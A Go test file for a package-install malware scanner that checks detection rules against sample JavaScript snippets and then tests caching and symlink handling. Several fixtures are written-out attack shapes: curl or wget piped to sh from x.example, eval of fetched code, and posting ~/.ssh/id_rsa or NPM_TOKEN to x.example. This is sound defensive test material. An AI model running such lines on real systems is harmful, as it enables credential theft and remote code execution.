package codescan

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/crossben/safe-install/internal/analyze"
)

func pkgDir(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func rules(fs []analyze.Finding) []string {
	var out []string
	for _, f := range fs {
		out = append(out, f.Rule+"/"+f.Severity.String())
	}
	return out
}

// Harmless imitations of real attack shapes. None of this code runs.
var malicious = map[string]struct {
	code string
	rule string
	sev  analyze.Severity
}{
	"exec curl":            {`const cp = require('child_process'); cp.execSync("curl -s https://x.example/p.sh | sh");`, "SI-CODE-001", analyze.High},
	"spawn powershell":     {"require('child_process').spawn(`powershell -enc ${payload}`)", "SI-CODE-001", analyze.High},
	"eval fetched":         {`https.get(u, r => { let b=''; r.on('data', c => b += c); r.on('end', () => eval(b)); });`, "SI-CODE-001", analyze.High},
	"Function of response": {`fetch(u).then(r => r.text()).then(t => new Function(t)());`, "SI-CODE-001", analyze.High},
	"exfil ssh":            {`const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8'); fetch('https://x.example/c', {method:'POST', body:k});`, "SI-CODE-002", analyze.High},
	"exfil token":          {`const t = process.env.NPM_TOKEN; https.request({host:'x.example', method:'POST'}).end(t);`, "SI-CODE-002", analyze.High},
	"obfuscator":           {strings.Repeat("var _0x3f2a1b=_0x4c1d['push'](_0x2e9f);", 120), "SI-CODE-003", analyze.Medium},
	"blob eval":            {`eval(Buffer.from('` + strings.Repeat("QUJD", 1500) + `','base64').toString())`, "SI-CODE-003", analyze.Medium},
}

func TestMaliciousShapes(t *testing.T) {
	for name, tc := range malicious {
		t.Run(name, func(t *testing.T) {
			got := Package(pkgDir(t, map[string]string{"index.js": tc.code}))
			want := tc.rule + "/" + tc.sev.String()
			found := false
			for _, r := range rules(got) {
				found = found || r == want
			}
			if !found {
				t.Fatalf("want %s, got %v", want, rules(got))
			}
		})
	}
}

// Real-world shapes that must stay quiet.
var benign = map[string]string{
	"webpack runtime": `__webpack_require__.g = (function() { try { return this || new Function('return this')(); } catch (e) {} })();` +
		strings.Repeat("\n// module code\n", 200) + `module.exports = () => fetch('/api/data');`,
	"wasm blob":           `const wasm = Buffer.from('` + strings.Repeat("AGFzbQEAAAA", 800) + `', 'base64'); WebAssembly.instantiate(wasm);`,
	"npm client":          `const rc = fs.readFileSync(path.join(home, '.npmrc'), 'utf8'); module.exports.config = ini.parse(rc);`,
	"build tool exec":     `const { execSync } = require('child_process'); execSync('node-gyp rebuild', { stdio: 'inherit' });`,
	"git exec":            "require('child_process').execFileSync('git', ['rev-parse', 'HEAD'])",
	"fetch only":          `export async function get(u) { const r = await fetch(u); return r.json(); }`,
	"curl in docs string": `// Install with: curl -fsSL https://bun.sh/install | bash` + "\nmodule.exports = 1;",
	"few hex names":       `var _0x1a2b = 1, _0x3c4d = 2; module.exports = _0x1a2b + _0x3c4d;`,
}

func TestBenignShapes(t *testing.T) {
	for name, code := range benign {
		t.Run(name, func(t *testing.T) {
			if got := Package(pkgDir(t, map[string]string{"index.js": code})); len(got) != 0 {
				t.Fatalf("false positive: %v", rules(got))
			}
		})
	}
}

func TestWhatIsScanned(t *testing.T) {
	evil := `require('child_process').execSync("wget -qO- https://x.example | sh")`
	dir := pkgDir(t, map[string]string{
		"lib/deep/a.cjs":              evil,                              // nested dirs and .cjs: scanned
		"node_modules/other/index.js": evil,                              // a nested package: its own scan
		"README.md":                   evil,                              // not code
		"big.js":                      strings.Repeat("x", 3<<20) + evil, // over the size cap
	})
	got := Package(dir)
	if len(got) != 1 || !strings.Contains(got[0].Message, "lib/deep/a.cjs") {
		t.Fatalf("got %+v", got)
	}
}

func TestOneFindingPerRulePerPackage(t *testing.T) {
	evil := `require('child_process').execSync("curl https://x.example | sh")`
	got := Package(pkgDir(t, map[string]string{"a.js": evil, "b.js": evil, "c.mjs": evil}))
	if len(got) != 1 || !strings.Contains(got[0].Message, "and 2 more file") {
		t.Fatalf("got %+v", got)
	}
}

func TestScanAllCachesByIntegrity(t *testing.T) {
	evil := `require('child_process').execSync("curl https://x.example | sh")`
	dir := pkgDir(t, map[string]string{"index.js": evil})
	local := pkgDir(t, map[string]string{"index.js": evil})
	s := &Scanner{CacheDir: t.TempDir()}
	targets := []Target{
		{ID: "evil@1.0.0", Integrity: "sha512-abc", Dir: dir},
		{ID: "local@1.0.0", Dir: local}, // file:/git dependency: no integrity, never cached
		{ID: "clean@1.0.0", Integrity: "sha512-def", Dir: pkgDir(t, map[string]string{"index.js": "module.exports = 1"})},
	}
	first := s.ScanAll(targets)
	if len(first["evil@1.0.0"]) != 1 || len(first["local@1.0.0"]) != 1 || len(first["clean@1.0.0"]) != 0 {
		t.Fatalf("first scan: %+v", first)
	}
	// Change the files on disk: cached versions keep their result, the
	// integrity-less package is rescanned.
	for _, d := range []string{dir, local} {
		if err := os.WriteFile(filepath.Join(d, "index.js"), []byte("module.exports = 1"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	second := s.ScanAll(targets)
	if len(second["evil@1.0.0"]) != 1 {
		t.Errorf("cached result not used: %+v", second["evil@1.0.0"])
	}
	if len(second["local@1.0.0"]) != 0 {
		t.Errorf("integrity-less package served from cache: %+v", second["local@1.0.0"])
	}
}

func TestScanAllWithoutCache(t *testing.T) {
	s := &Scanner{}
	got := s.ScanAll([]Target{{ID: "a@1.0.0", Integrity: "sha512-x", Dir: pkgDir(t, map[string]string{"index.js": "module.exports = 1"})}})
	if len(got["a@1.0.0"]) != 0 {
		t.Fatalf("got %+v", got)
	}
}

// A package must not make the scanner read files outside it.
func TestSymlinksOutOfThePackageAreNotRead(t *testing.T) {
	outside := filepath.Join(t.TempDir(), "secret.js")
	if err := os.WriteFile(outside, []byte(`require('child_process').execSync("curl https://x.example | sh")`), 0o600); err != nil {
		t.Fatal(err)
	}
	dir := pkgDir(t, map[string]string{"package.json": "{}"})
	if err := os.Symlink(outside, filepath.Join(dir, "index.js")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if err := os.Symlink(filepath.Dir(outside), filepath.Join(dir, "lib")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if got := Package(dir); len(got) != 0 {
		t.Fatalf("read through a symlink: %+v", got)
	}
}
